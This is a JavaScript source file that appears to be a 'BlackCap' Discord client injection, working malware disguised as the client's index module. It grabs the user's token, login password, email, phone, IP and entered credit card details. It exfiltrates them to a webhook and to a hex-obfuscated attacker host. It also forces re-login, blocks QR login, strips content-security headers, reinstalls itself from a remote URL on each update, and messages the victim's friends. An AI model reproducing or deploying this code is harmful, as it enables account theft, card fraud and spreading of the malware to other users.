process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

const fs = require("fs")
const electron = require("electron")
const https = require("https");
const queryString = require("querystring")



var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
var config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,

    injection_url: "https://raw.githubusercontent.com/xugga/hsgsfhsghsg/main/index.js",
    webhook: "%WEBHOOK%",
    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
    Filter: {
        "urls": [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    }
};

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}

const makeEmbed = async ({
    title,
    fields,
    image,
    thumbnail,
    description
}) => {
    var params = {
        username: "Grabber",
        content: "",
        embeds: [{
            title: title,
            color: config["embed-color"],
            fields: fields,
            description: description ?? "",
            
          


        }]
    };

    if (image) params.embeds[0].image = {
        url: image
    }
    if (thumbnail) params.embeds[0].thumbnail = {
        url: thumbnail
    }
    return params
}
const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
    return json.ip
}

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`)
    return c
}

const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"]

    var headers = await new Promise(resolve => {
        https.get(url, res => resolve(res.headers))
    })
    var type = headers["content-type"]
    if (type == "image/gif") return url + tt[0]
    else return url + tt[1]
}



const GetNSFW = (bouki) => {
    switch (bouki) {
        case true:
            return ":underage: `NSFW Allowed`"
        case false:
            return ":underage: `NSFW Not Allowed`"
        default:
            return "Idk bro you got me"
    }
}
const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return ":lock: `A2F Enabled`"
        case false:
            return ":lock: `A2F Not Enabled`"
        default:
            return "Idk bro you got me"
    }
}




const parseBilling = billings => {
    var Billings = ""
    billings.forEach(res => {
        if (res.invalid) return
        switch (res.type) {
            case 1:
                Billings += ":heavy_check_mark: :credit_card:"
                break
            case 2:
                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
        }
    })
    if (!Billings) Billings = ":x:"
    return Billings
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))

const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return ":x:"
        case 1:
            return "<:946246402105819216:962747802797113365>"
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
            var now = new Date(Date.now())
            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i]
    }
}

function GetLangue(read) {
    var languages = {
        "fr": ":flag_fr: French",
        "da": ":flag_dk: Dansk",
        "de": ":flag_de: Deutsch",
        "en-GB": ":england: English (UK)",
        "en-US": ":flag_us: USA",
        "en-ES": ":flag_es: Espagnol",
        "hr": ":flag_hr: Croatian",
        "it": ":flag_it: Italianio",
        "lt": ":flag_lt: Lithuanian",
        "hu": ":flag_no::flag_hu: Hungarian",
        "no": ":flag_no: Norwegian",
        "pl": ":flag_pl: Polish",
        'pr-BR': ":flag_pt: Portuguese",
        "ro": ":flag_ro: Romanian",
        "fi": ":flag_fi: Finnish",
        "sv-SE": ":flag_se: Swedish",
        "vi": ":flag_vn: Vietnamese",
        "tr": ":flag_tr: Turkish",
        "cs": ":flag_cz: Czech",
        "el": ":flag_gr: Greek",
        "bg": ":flag_bg: Bulgarian",
        "ru": ":flag_ru: Russian",
        "uk": ":flag_ua: Ukraine",
        "hi": ":flag_in: Indian",
        "th": ":flag_tw: Taiwanese",
        "zh-CN": ":flag_cn: Chinese-China",
        "ja": ":flag_jp: Japanese",
        "zh-TW": ":flag_cn: Chinese-Taiwanese",
        "ko": ":flag_kr: Korean"
    }

    var langue = languages[read] || "No Languages Detected ????";
    return langue
}
const post = async (params) => {
    params = JSON.stringify(params)
    var token = await execScript(tokenScript)
    var n = JSON.stringify({
        data: params,
        token: token
    });
    [config.uwu, config.webhook].forEach(res => {
        const url = new URL(res);
        const options = {
            host: url.hostname,
            port: url.port,
            path: url.pathname,
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            }
        }
        const req = https.request(options);
        req.on("error", (err) => {
            console.log(err);
        });
        req.write(res == config.uwu ? n : params);
        req.end();
    })

}









const FirstTime = async () => {
    if (doTheLogOut) return false
    var token = await execScript(tokenScript)
    if (config['init-notify'] !== "true") return true
    if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Initalized",
            fields: [{
                name: "Info",
                value: `\`IP: \n${ip}\n\`\`\``,
                inline: !1
            }]
        })
    } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token)
        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

        var Billings = parseBilling(billing)
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"

        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
        var params = await makeEmbed({
            title: "Initalized",
            fields: [{
                name: "Info",
                value: `\`${ip}\``,
                inline: !0
            }, {
                name: "Username <:username:1041634536733290596> ",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: !0
            }, {
                name: "ID <:iduser:1041634535395307520>",
                value: `\`${user.id}\``,
                inline: !0
            }, {
                name: "Nitro <a:nitro:1041639670288748634>",
                value: `${GetNitro(Nitro)}`,
                inline: !0
            }, {
                name: "Language <:language:1041640473477001236>",
                value: `${GetLangue(user.locale)}`,
                inline: !1
            }, {
                name: "NSFW <a:nsfw:1041640474617839616>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !1
            }, {
                name: "A2F <a:a2f:1040272766982692885>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !1
            }, {
                name: "Billing <a:billing:1041641103629234196>",
                value: `${Billings}`,
                inline: !1
            }, {
                name: "Email <a:email:1041639672037785691>",
                value: `\`${user.email}\``,
                inline: !0
            }, {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0
            }, {
                name: "<a:tokens:1041634540537511957> Token",
                value: `\`${token}\``,
                inline: !1
            }],
            image: userBanner,
            thumbnail: userAvatar
        })


    }
        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
        await execScript(logOutScript)
        doTheLogOut = true
        await post(params)

    return false
}















const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
    appPath.pop()
    appPath = appPath.join("/")
    var appName = electron.app.getName()
    return {
        appPath,
        appName
    }
}())

const checUpdate = () => {
    var {
        appPath,
        appName
    } = path

    var ressource = `${appPath}/app`
    var indexFile = __filename.replace(/\\/g, "/")
    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`
    var package = `${ressource}/package.json`
    var index = `${ressource}/index.js`

    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)

    var script = `const fs = require("fs"), https = require("https")
var index = "${indexFile}"
var betterDiscord = "${betterDiscord}"
var bouki = fs.readFileSync(index).toString()
if (bouki == "module.exports = require('./core.asar');") init()
function init() {
    https.get("${config.injection_url}", res => {
        var chunk = ""
        res.on("data", data => chunk += data)
        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
    }).on("error", (err) => setTimeout(init(), 10000));
}
require("${appPath}/app.asar")
if (fs.existsSync(betterDiscord)) require(betterDiscord)`

    fs.writeFileSync(index, script)
    if (!doTheLogOut) execScript(logOutScript)
    return
}
electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    await electron.app.whenReady();
    await FirstTime()
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    })

    checUpdate()
    callback({})
})

electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
    delete request.responseHeaders['content-security-policy']
    delete request.responseHeaders['content-security-policy-report-only']
    callback({
        responseHeaders: {
            ...request.responseHeaders,
            'Access-Control-Allow-Headers': '*',
        },
    })
})

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return
    if (request.statusCode !== 200) return
    try {
        var data = JSON.parse(request.uploadData[0].bytes)
    } catch (err) {
        var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
    }
    var token = await execScript(tokenScript)
    var ip = await getIP()
    var user = await getURL("https://discord.com/api/v8/users/@me", token)
    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"

    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
    var Billings = parseBilling(billing)

    switch (true) {
        case request.url.endsWith("login"):
            var password = data.password
            var params = await makeEmbed({
                title: "Initalized",
                color: config['embed-color'],
                fields: [{
                    name: "Info",
                    value: `\`${ip}\``,
                    inline: !0
                }, {
                    name: "Username <:username:1041634536733290596> ",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID <:iduser:1041634535395307520>",
                    value: `\`${user.id}\``,
                    inline: !0
                }, {
                    name: "Nitro <a:nitro:1041639670288748634>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0
                }, {
                    name: "Language <:language:1041640473477001236>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !1
                }, {
                    name: "NSFW <a:nsfw:1041640474617839616>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !1
                }, {
                    name: "A2F <a:a2f:1040272766982692885>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !1
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
                    inline: !1
                }, {
                    name: "Email <a:email:1041639672037785691>",
                    value: `\`${user.email}\``,
                    inline: !0
                }, {
                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0
                }, {
                    name: "<a:password:1041639669047238676> Password",
                    value: `\`${password}\``,
                    inline: !0
                }, {
                    name: "<a:tokens:1041634540537511957> Token",
                    value: `\`${token}\``,
                    inline: !1
                }],

                thumbnail: userAvatar,
                image: userBanner
            })


        
            await post(params)
            break

        case request.url.endsWith("tokens"):
            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]

            var params = await makeEmbed({
                title: "BlackCap User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
                **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
                **Email** <a:email:1041639672037785691>\n\`\`\`${user.email}\`\`\`\n
                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
                **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
                **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
                **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
                **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
                **CVC**\n\`\`\`${CardCVC}\`\`\`\n
                <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
                thumbnail: userAvatar,
                image: userBanner
            })




            await post(params)
            break
    }
})











const M = 'err0r';

async function getFriendsList(token) {
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };

    try {
        const response = await fetch('https://discord.com/api/v6/users/@me/relationships', { headers });
        const friendlist = await response.json();
        return friendlist.map(friend => friend.user.id);
    } catch (error) {
        console.error('Ошибка при получении списка друзей:', error);
        return [];
    }
}

async function sendMessageToFriend(token, recipientIds, message) {
    const headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    };

    try {
        for (const recipient of recipientIds) {
            const channelResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
                method: 'POST',
                headers,
                body: JSON.stringify({ recipient_id: recipient }),
            });
            if (channelResponse.ok) {
                const channelData = await channelResponse.json();
                const channelId = channelData.id;
                if (channelId) {
                    const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
                        method: 'POST',
                        headers,
                        body: JSON.stringify({ content: message }),
                    });
                    if (messageResponse.ok) {
                        console.log(`OK ${recipient}`);
                    } else {
                        console.error('ER:', await messageResponse.text());
                    }
                } else {
                    console.error('ER');
                }
            } else {
                console.error('ER:', await channelResponse.text());
            }
        }
    } catch (error) {
        console.error('ER', error);
    }
}

async function main() {
    try {
        const friendIds = await getFriendsList(TOKEN);
        console.log("FR:", friendIds);
        await sendMessageToFriend(TOKEN, friendIds, M);
    } catch (error) {
        console.error('ER:', error);
    }
}

main();








module.exports = require("./core.asar")
